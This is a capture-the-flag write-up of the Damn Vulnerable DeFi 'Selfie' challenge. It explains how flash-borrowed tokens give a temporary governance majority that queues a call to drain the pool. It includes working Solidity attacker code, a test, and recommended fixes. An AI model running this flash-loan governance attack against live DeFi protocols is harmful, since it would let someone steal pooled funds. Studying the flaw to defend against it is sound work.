# Selfie — Flash-Borrowing a Governance Majority

**Challenge:** Damn Vulnerable DeFi v4 — Selfie
**Category:** Governance Manipulation / Flash Loan Voting Power
**Severity:** Critical (the whole pool is drained, and no capital is needed)

## What's going on

A pool holds 1.5M tokens out of a 2M supply and offers free flash loans of that same
token. The token is also the voting token for a small governance contract. The pool has
an `emergencyExit` function that sends its entire balance to any address, callable only
by governance. The goal is to move all 1.5M tokens to a recovery account.

Each piece looks reasonable alone. The problem is that the loan asset, the voting asset
and the governance powers all line up.

## The bug

`SimpleGovernance.queueAction` allows an action if the caller has more than half the
total supply in votes:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

`getVotes` returns voting power **right now**, not at a past block. The pool's flash
loan hands out 1.5M tokens (75% of the supply) for the length of one transaction, so a
borrower can hold a majority for exactly as long as it needs to queue an action.

What an action can do is the other half of the problem. `SelfiePool.emergencyExit`
transfers the whole balance to a receiver of the caller's choosing, guarded only by
`onlyGovernance`:

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);
}
```

So whoever can queue a governance action can queue "send everything to me".

## The attack

1. The attacker contract calls `pool.flashLoan` for the pool's full balance.
2. In `onFlashLoan`, it calls `token.delegate(address(this))`. This is an ERC20Votes
   token, so borrowed tokens count as votes only once they are delegated.
3. With more than 50% of the supply in votes, it calls
   `governance.queueAction(pool, 0, emergencyExit(recovery))`.
4. It approves the pool for the loan amount and returns the callback success value, so
   the loan is repaid in the same transaction.
5. After the governance delay (2 days), anyone calls `executeAction`. The pool, called by
   governance, sends its whole balance to the recovery account.

## PoC

```solidity
function test_selfie() public checkSolvedByPlayer {
    SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
    attacker.attack();

    vm.warp(block.timestamp + governance.getActionDelay());
    governance.executeAction(attacker.actionId());
}

contract SelfieAttacker is IERC3156FlashBorrower {
    // ...
    function attack() external {
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        token.delegate(address(this));
        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

Full test file: `test/selfie/Selfie.t.sol`

## Why I'm calling this Critical

- **Total loss of the pool.** All 1.5M tokens are redirected to the attacker.
- **No capital.** The flash loan is free, so the attacker needs only gas.
- **The 2-day delay is not a defense here.** The action is queued permanently while the
  borrowed votes exist for one transaction, and nobody is positioned to cancel it. There
  is no cancel function, no quorum over a voting period, and no veto.
- **Governance has a single-call drain.** `emergencyExit` empties the pool in one step.

## Fix

- Measure voting power at a **past snapshot** (for example the block before the proposal,
  via `getPastVotes`), as OpenZeppelin's `Governor` does. Flash-borrowed tokens cannot
  exist at a past block.
- Add a voting period and a quorum, so a single account cannot pass an action alone,
  plus a way to cancel malicious proposals during the delay.
- Narrow what governance can do to the pool: no unconditional `emergencyExit`, or add a
  recipient restriction and a withdrawal cap.
- Avoid using the lending asset as the voting asset when the pool is the biggest holder.

## Takeaway

If voting power comes from a token that can be flash-borrowed, any governance check that
reads the current balance or current votes is exploitable. Search proposal and quorum
logic for `getVotes` and `balanceOf`, and ask whether a past-block snapshot is used.
Then look at what governance is allowed to call, and whether one queued action can move
all the funds.
